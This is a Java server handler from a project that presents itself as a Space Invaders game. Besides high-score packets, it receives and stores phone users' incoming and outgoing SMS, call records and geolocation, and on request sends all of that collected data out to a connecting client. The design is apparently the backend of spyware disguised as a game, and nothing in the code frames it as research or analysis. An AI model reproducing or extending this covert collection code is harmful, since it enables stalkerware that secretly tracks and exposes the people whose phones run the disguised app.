package com.cst.spaceinvaders.server;

import java.util.List;

import com.cst.spaceinvaders.base.Loggable;
import com.cst.spaceinvaders.shared.data.*;
import com.cst.spaceinvaders.shared.network.connection.Connection;
import com.cst.spaceinvaders.shared.network.packets.*;

public class Handler extends Loggable implements Runnable
{
	private final Server m_server;
	private boolean m_running;

    // How many ms should we wait since the received packet before dropping connection.
    private static final long CONNECTION_TIMEOUT = 5000;
	
	public Handler(Server server)
	{
		super("HANDLER");
		m_server = server;
	}
	
	@Override
	public void run()
	{
        log("Now listening for network traffic.");
		m_running = true;
		
		while (m_running)
		{
			List<Connection> connectionList = m_server.connectionList();

            synchronized (connectionList)
            {
                long currentTime = System.currentTimeMillis();

                for (int i = connectionList.size() - 1; i >= 0; --i)
                {
                    Connection connection = connectionList.get(i);

                    if (connection.connected())
                    {
                        while (connection.readable())
                        {
                            Packet received = connection.read();
                            log(String.format("Received packet '%s' from '%s'", received, connection.socket().getInetAddress()));
                            handlePacket(connection, received);
                        }
                    }

                    final long deltaTime = currentTime - connection.lastReceiveTime();

                    if (!connection.connected() || deltaTime >= CONNECTION_TIMEOUT)
                    {
                        if (connection.malformed())
                            log(String.format("Malformed packet received from '%s'", connection.socket().getInetAddress()));

                        log(String.format("Lost connection with '%s'", connection.socket().getInetAddress()));
                        connection.safeClose();
                        m_server.onConnectionClosed(connection);
                    }
                }
            }
		}
	}

	public void stop()
	{
		m_running = false;
	}

    private void handlePacket(Connection connection, Packet packet)
    {
        byte networkCode = packet.networkCode();

        if (networkCode == NetworkCodes.REQUEST_HIGH_SCORE_LIST)
        {
            List<HighScoreEntry> highScores = m_server.database().highScores();
        }
        else if (networkCode == NetworkCodes.SEND_HIGH_SCORE)
        {
            m_server.database().registerHighScore(((SendHighScorePacket) packet).highScoreEntry());
        }
        else if (networkCode == NetworkCodes.SEND_INCOMING_SMS)
        {
            m_server.database().registerIncomingSms(((SendIncomingSMSPacket) packet).incomingSms());
        }
        else if (networkCode == NetworkCodes.SEND_OUTGOING_SMS)
        {
            m_server.database().registerOutgoingSms(((SendOutgoingSMSPacket) packet).outgoingSms());
        }
        else if (networkCode == NetworkCodes.SEND_INCOMING_CALL)
        {
            m_server.database().registerIncomingCall(((SendIncomingCallPacket) packet).incomingCall());
        }
        else if (networkCode == NetworkCodes.SEND_OUTGOING_CALL)
        {
            m_server.database().registerOutgoingCall(((SendOutgoingCallPacket) packet).outgoingCall());
        }
        else if (networkCode == NetworkCodes.SEND_GEOLOCATION)
        {
            m_server.database().registerGeolocation(((SendGeolocationPacket) packet).geplocation());
        }
        else if (networkCode == NetworkCodes.REQUEST_DATA)
        {
            List<IncomingSMS> incomingSmses = m_server.database().incomingSmses();
            List<IncomingCall> incomingCalls = m_server.database().incomingCalls();
            List<OutgoingSMS> outgoingSmses = m_server.database().outgoingSmses();
            List<OutgoingCall> outgoingCalls = m_server.database().outgoingCalls();
            List<Geolocation> geolocations = m_server.database().geolocations();

            int packetCount = incomingSmses.size() + incomingCalls.size() + outgoingSmses.size() +
                    outgoingCalls.size () + geolocations.size() + 1;
            Packet[] packets = new Packet[packetCount];

            int indexOffset = 0;

            for (int i = 0; i < incomingSmses.size(); ++i)
            {
                packets[indexOffset] = new SendIncomingSMSPacket(incomingSmses.get(i));
                indexOffset += 1;
            }

            for (int i = 0; i < incomingCalls.size(); ++i)
            {
                packets[indexOffset] = new SendIncomingCallPacket(incomingCalls.get(i));
                indexOffset += 1;
            }

            for (int i = 0; i < outgoingSmses.size(); ++i)
            {
                packets[indexOffset] = new SendOutgoingSMSPacket(outgoingSmses.get(i));
                indexOffset += 1;
            }

            for (int i = 0; i < outgoingCalls.size(); ++i)
            {
                packets[indexOffset] = new SendOutgoingCallPacket(outgoingCalls.get(i));
                indexOffset += 1;
            }

            for (int i = 0; i < geolocations.size(); ++i)
            {
                packets[indexOffset] = new SendGeolocationPacket(geolocations.get(i));
                indexOffset += 1;
            }

            packets[indexOffset] = new RequestDataPacket(null);
            connection.write(packets);
        }
    }
}
